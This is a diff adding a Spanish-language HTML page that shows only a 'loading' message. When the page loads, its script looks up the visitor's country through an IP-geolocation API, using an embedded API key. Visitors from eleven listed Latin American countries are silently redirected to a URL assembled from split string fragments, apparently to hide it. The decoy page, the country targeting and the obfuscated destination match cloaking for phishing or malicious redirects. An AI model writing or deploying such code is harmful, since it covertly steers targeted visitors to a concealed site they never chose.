@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sitio Principal</title>
+    <script>
+
+    </script>
+</head>
+<body>
+    <p style="font-family: sans-serif;color: #777;">Cargando sitio ...</p>
+    <script>
+        window.onload = function(){
+            fetch('https://api.ipgeolocation.io/ipgeo?apiKey=0c3260ad7b5042ec92c4daac3e2b26af')
+                .then(response => response.json())
+                .then(data => {
+                    const countryCode = data.country_code2;
+                    console.log(data.country_code2);
+                    const countriesToRedirect = ['SV', 'MX', 'EC', 'GT', 'PE', 'NI', 'HN', 'PA', 'DO','PR','UY' ];
+                    var part1 = 'ps://dev-vswebs.pant';
+                    var part2 = 'heonsite.io/';
+
+                    if (countriesToRedirect.includes(countryCode)) {
+                        window.location.href = 'htt' + part1 + part2;
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
+
